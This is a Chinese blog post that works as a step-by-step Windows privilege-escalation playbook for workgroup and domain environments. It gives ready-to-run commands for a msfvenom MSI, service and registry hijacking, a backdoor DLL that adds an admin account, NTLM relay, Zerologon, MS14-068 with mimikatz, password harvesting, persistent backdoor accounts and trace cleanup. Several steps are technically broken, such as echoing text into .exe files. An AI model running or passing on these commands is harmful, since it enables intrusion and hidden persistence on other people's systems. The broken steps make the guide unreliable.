+++
date = '2026-02-15'
draft = false
title = 'Windows提权'

+++

# Windows工作组环境和域环境提权方式详解

## 一、工作组环境提权方式

### 1. AlwaysInstallElevated提权

**条件**：

- 系统已启用AlwaysInstallElevated（注册表值为1）

**检查方法**：

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**利用步骤**：

1. 生成恶意MSI文件（在Kali Linux中）：

   ```cmd
   msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd -f msi -o add.msi
   ```

   *如果在Windows上操作，可以使用在线工具生成MSI文件*

2. 在Windows上执行：

   ```cmd
   msiexec /i add.msi
   ```

3. 验证提权：

   ```cmd
   net user hacker
   ```

**成功标志**：看到hacker账户，且在管理员组中

---

### 2. 服务权限配置错误提权

**条件**：

- 服务路径权限配置错误
- 当前用户对服务可执行文件或目录有写权限

**检查方法**：

```cmd
sc query
winpeas.exe quiet notcolor serviceinfo
```

**利用步骤**：

1. 找到一个服务（如Spooler）：

   ```cmd
   sc qc Spooler
   ```

2. 修改服务路径：

   ```cmd
   reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler" /t REG_EXPAND_SZ /v ImagePath /d "C:\evil\shell.exe" /f
   ```

3. 重启服务：

   ```cmd
   net stop Spooler
   net start Spooler
   ```

**成功标志**：`shell.exe`以系统权限运行

---

### 3. 未引用的服务路径提权

**条件**：

1. 服务路径没有用引号引起来
2. 服务路径中存在空格
3. 服务以最高权限启动
4. 当前用户对路径有写权限

**检查方法**：

```cmd
sc query
winpeas.exe quiet notcolor serviceinfo
icacls "C:\"
```

**利用步骤**：

1. 创建服务（需要管理员权限）：

   ```cmd
   sc create "service" binpath= "C:\Program Files\Common Files\test.exe" start= auto
   ```

2. 检查服务权限：

   ```cmd
   sc qc service
   ```

3. 给用户写权限：

   ```cmd
   icacls "C:\Program Files\Common Files" /grant Users:(OI)(CI)F /T
   ```

4. 在C盘创建恶意文件：

   ```cmd
   echo net user hacker P@ssw0rd /add > C:\Program.exe
   echo net localgroup administrators hacker /add >> C:\Program.exe
   ```

5. 重启服务（等待自动启动）：

   ```cmd
   net stop service
   net start service
   ```

**成功标志**：`hacker`账户被添加为管理员

---

### 4. DLL劫持提权

**条件**：

- 目标程序会加载DLL
- 当前用户对程序目录有写权限

**检查方法**：

```cmd
procmon.exe /accepteula /quiet /minimized /background /d "C:\procmon.log" /n "Service.exe"
```

**利用步骤**：

1. 找到目标程序（如notepad.exe）：

   ```cmd
   where notepad
   ```

2. 创建恶意DLL（使用Visual Studio）：

   ```c
   #include <windows.h>
   BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
       WinExec("net user hacker P@ssw0rd /add", SW_HIDE);
       WinExec("net localgroup administrators hacker /add", SW_HIDE);
       return TRUE;
   }
   ```

3. 将DLL放到目标程序目录：

   ```cmd
   copy evil.dll "C:\Program Files\Notepad\"
   ```

4. 重启目标程序：

   ```cmd
   taskkill /f /im notepad.exe
   notepad.exe
   ```

**成功标志**：`hacker`账户被添加为管理员

---

### 5. Serv-U FTP服务提权

**条件**：

- Serv-U FTP服务已安装
- Serv-U安装目录可写

**利用步骤**：

1. 下载ServUDaemon.ini：

   ```cmd
   wget http://目标IP/ServUDaemon.ini
   ```

2. 修改配置文件（添加管理员用户）：

   ```
   [Users]
   User=hacker
   Password=P@ssw0rd
   Group=Administrators
   Directory=C:\
   ```

3. 上传修改后的文件：

   ```cmd
   upload ServUDaemon.ini
   ```

4. 用新账户登录FTP：

   ```cmd
   ftp 192.168.1.100
   User: hacker
   Password: P@ssw0rd
   ```

5. 验证提权：

   ```cmd
   quote site exec net user admin P@ssw0rd /add
   ```

**成功标志**：成功添加新管理员账户

---

### 6. 密码收集提权

**条件**：

- 浏览器保存了密码
- 有VNC密码

**利用步骤**：

1. 浏览器密码：

   ```cmd
   WebBrowserPassView.exe /shtml "C:\passwords.html"
   ```

2. VNC密码：

   ```cmd
   reg query HKEY_CURRENT_USER\Software\TightVNC\Server
   vncpwd.exe "加密密码"
   ```

3. 使用获取的密码提权：

   ```cmd
   runas /user:domain\administrator "cmd.exe"
   ```

**成功标志**：使用获取的密码获取管理员权限

---

## 二、域环境提权方式

### 1. NTLM中继提权

**条件**：

- 能获取Net-NTLM Hash
- 域用户是域管理员组成员

**利用步骤**：

1. 获取Net-NTLM Hash：

   ```cmd
   responder -I eth0 -wrf
   ```

2. 使用NTLM中继：

   ```cmd
   ntlmrelayx.py -t 192.168.1.100 -smb2support
   ```

**成功标志**：获得域控制器的访问权限

---

### 2. GPP组策略首选项提权

**条件**：

- 域环境
- 组策略首选项配置错误

**利用步骤**：

1. 找到加密密码：

   ```cmd
   dir \\域控制器\SYSVOL\domain.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups
   ```

2. 解密密码：

   ```cmd
   gpp-decrypt.py "加密密码"
   ```

3. 使用解密密码登录：

   ```cmd
   psexec.py domain.com/domain_admin:解密密码@域控制器
   ```

**成功标志**：获得域管理员权限

---

### 3. CVE-2020-1472提权（Zerologon）

**条件**：

- 域控制器运行Windows Server 2008 R2/2012/2012 R2/2016/2019
- 未安装2020年8月的补丁

**利用步骤**：

1. 使用工具攻击：

   ```cmd
   python CVE-2020-1472.py 域控制器IP 域名 域用户 密码
   ```

2. 获取域管理员权限：

   ```cmd
   psexec.py domain.com/domain_admin:密码@域控制器
   ```

**成功标志**：获得域管理员权限

---

### 4. MS14-068提权

**条件**：

- 系统已知SID
- 域用户有密码

**利用步骤**：

1. 获取域用户SID：

   ```cmd
   whoami /user
   ```

2. 生成Kerberos票据：

   ```cmd
   MS14-068.exe -u "domain_user@domain.com" -p "password" -s "S-1-5-21-..." -d "域控制器IP"
   ```

3. 使用票据：

   ```cmd
   mimikatz # kerberos::ptc "TGT_domain_user@domain.ccache"
   psexec.py domain.com/domain_user@域控制器
   ```

**成功标志**：获得域控制器访问权限

---

## 三、提权前必备检查

在尝试提权前，先运行以下命令检查：

```cmd
whoami /priv          :: 查看当前权限
systeminfo            :: 查看系统信息
net user              :: 查看所有用户
net localgroup administrators :: 查看管理员组成员
sc query              :: 查看所有服务
icacls C:\            :: 检查C盘权限
winpeas.exe quiet notcolor serviceinfo :: 自动检查提权点
```

## 四、提权成功后

1. **创建持久化账户**：

   ```cmd
   net user hacker P@ssw0rd /add
   net localgroup administrators hacker /add
   ```

2. **清理痕迹**：

   ```cmd
   del evil.bat
   del add.msi
   ```

3. **保持权限**：

   ```cmd
   mimikatz # privilege::debug
   mimikatz # token::elevate
   ```

## 五、提权小技巧

1. **先检查**：`whoami /priv`、`sc query`、`icacls C:\`
2. **再利用**：根据检查结果，选择最简单的提权方式
3. **最后验证**：`net localgroup administrators`，看是否成功



## 附录：提权方式快速对照表

| 提权方式              | 适用环境  | 操作难度 | 成功率 |
| --------------------- | --------- | -------- | ------ |
| AlwaysInstallElevated | 工作组/域 | ★☆☆☆☆    | ★★★★★  |
| 服务权限配置错误      | 工作组/域 | ★★☆☆☆    | ★★★★☆  |
| 未引用的服务路径      | 工作组    | ★★☆☆☆    | ★★★★☆  |
| DLL劫持               | 工作组    | ★★★☆☆    | ★★★☆☆  |
| Serv-U提权            | 工作组    | ★★★☆☆    | ★★★☆☆  |
| GPP组策略提权         | 域环境    | ★★★★☆    | ★★★★☆  |
| CVE-2020-1472         | 域环境    | ★★★★☆    | ★★★★☆  |
| NTLM中继              | 域环境    | ★★★★☆    | ★★★★☆  |





# 根据命令结果选择提权方式的实战指南

## 一、命令结果分析与提权方式选择

### 1. `whoami /priv` 结果分析

| 权限名称                        | 说明                 | 对应提权方式                               |
| ------------------------------- | -------------------- | ------------------------------------------ |
| `SeImpersonatePrivilege`        | 可以模拟其他用户身份 | **土豆家族提权** (JuicyPotato/RoguePotato) |
| `SeAssignPrimaryTokenPrivilege` | 可以分配主令牌       | **土豆家族提权**                           |
| `SeServiceLogonRight`           | 可以作为服务登录     | **服务提权**                               |
| `SeBackupPrivilege`             | 可以备份文件         | **备份提权**                               |
| `SeTakeOwnershipPrivilege`      | 可以获取文件所有权   | **文件所有权提权**                         |

> ✅ **小提示**：如果看到`SeImpersonatePrivilege`，这是最简单的提权方式之一。

---

### 2. `sc query` 结果分析

**重点检查**：服务名称、状态、路径

| 服务状态  | 路径特征             | 提权方式                 |
| --------- | -------------------- | ------------------------ |
| `RUNNING` | 路径包含空格且无引号 | **未引用服务路径提权**   |
| `RUNNING` | 路径权限可写         | **服务权限配置错误提权** |
| `RUNNING` | 以SYSTEM身份运行     | **服务提权**             |
| `STOPPED` | 有修改权限           | **服务提权**             |

> ✅ **小提示**：运行`sc qc 服务名`查看具体路径，如`sc qc Spooler`

---

### 3. `icacls C:\` 结果分析

| 权限配置                                | 说明                   | 提权方式                 |
| --------------------------------------- | ---------------------- | ------------------------ |
| `Everyone:(F)`                          | Everyone有完全控制权限 | **系统路径配置问题提权** |
| `BUILTIN\Users:(OI)(CI)(RX)`            | 用户有读取权限         | **DLL劫持**              |
| `NT AUTHORITY\Authenticated Users:(AD)` | 认证用户有添加权限     | **计划任务提权**         |

> ✅ **小提示**：如果看到`Everyone:(F)`，说明C盘权限非常宽松，可以写入。

---

## 二、提权方式选择流程图

![提权](images.png)

---

## 三、实战案例分析

### 案例1：`whoami /priv` 显示有`SeImpersonatePrivilege`

**提权方式**：土豆家族提权（JuicyPotato）

**步骤**：

1. 下载JuicyPotato工具

2. 运行：

   ```cmd
   JuicyPotato.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
   ```

**成功标志**：输出`nt authority\system`

---

### 案例2：`sc query` 显示有服务路径包含空格

**服务信息**：

```
SERVICE_NAME: Spooler
DISPLAY_NAME: Print Spooler
BINARY_PATH_NAME: C:\Program Files\Print Spooler\spooler.exe
```

**提权方式**：未引用服务路径提权

**步骤**：

1. 创建恶意文件：

   ```cmd
   echo net user hacker P@ssw0rd /add > C:\Program Files\Print Spooler\spooler.exe
   ```

2. 修改服务路径：

   ```cmd
   sc config Spooler binpath= "C:\Program Files\Print Spooler\spooler.exe"
   ```

3. 重启服务：

   ```cmd
   net stop Spooler
   net start Spooler
   ```

**成功标志**：`hacker`账户被添加为管理员

---

### 案例3：`icacls C:\` 显示 `Everyone:(F)`

**提权方式**：系统路径配置问题提权

**步骤**：

1. 创建恶意批处理文件：

   ```cmd
   echo net user hacker P@ssw0rd /add > C:\evil.bat
   echo net localgroup administrators hacker /add >> C:\evil.bat
   ```

2. 运行：

   ```cmd
   C:\evil.bat
   ```

**成功标志**：`hacker`账户被添加为管理员

---

### 案例4：`sc query` 显示有服务权限配置错误

**服务信息**：

```
SERVICE_NAME: MyService
DISPLAY_NAME: My Custom Service
BINARY_PATH_NAME: C:\MyService\service.exe
```

**提权方式**：服务权限配置错误提权

**步骤**：

1. 检查服务权限：

   ```cmd
   icacls "C:\MyService"
   ```

2. 如果显示`Everyone:(F)`，则：

   ```cmd
   echo net user hacker P@ssw0rd /add > C:\MyService\service.exe
   ```

3. 重启服务：

   ```cmd
   net stop MyService
   net start MyService
   ```

**成功标志**：`hacker`账户被添加为管理员

---

## 四、提权方式优先级排序

| 提权方式             | 操作难度 | 成功率 | 适用场景                     |
| -------------------- | -------- | ------ | ---------------------------- |
| **土豆家族提权**     | ★☆☆☆☆    | ★★★★★  | 有SeImpersonatePrivilege权限 |
| **系统路径配置问题** | ★★☆☆☆    | ★★★★☆  | Everyone有C盘完全控制权限    |
| **服务权限配置错误** | ★★☆☆☆    | ★★★★☆  | 服务路径权限可写             |
| **未引用服务路径**   | ★★★☆☆    | ★★★☆☆  | 服务路径有空格且无引号       |
| **DLL劫持**          | ★★★☆☆    | ★★★☆☆  | 目标程序路径可写             |

---

## 五、提权前必做检查清单

1. **检查权限**：`whoami /priv`
   - 有`SeImpersonatePrivilege` → 优先尝试土豆家族提权

2. **检查服务**：`sc query`
   - 找到运行中的服务 → 检查`sc qc 服务名`

3. **检查目录权限**：`icacls C:\`
   - Everyone有`(F)` → 优先尝试系统路径提权

4. **检查DLL路径**：`where notepad`
   - 找到程序路径 → 检查权限

---

## 六、实战技巧

1. **快速检查**：`winpeas.exe quiet notcolor serviceinfo`
   - 自动检查所有提权点

2. **验证提权**：`whoami` 和 `net localgroup administrators`
   - 确认是否获得管理员权限

3. **保持权限**：`net user hacker P@ssw0rd /add` + `net localgroup administrators hacker /add`
   - 创建持久化管理员账户

---

## 总结：提权三步

1. **检查**：`whoami /priv`、`sc query`、`icacls C:\`
2. **判断**：根据结果选择最简单的提权方式
3. **执行**：按照对应方式执行提权命令

> 提示**：提权成功后，**务必创建持久化账户（`net user hacker P@ssw0rd /add` + `net localgroup administrators hacker /add`），避免因会话结束而失去权限。

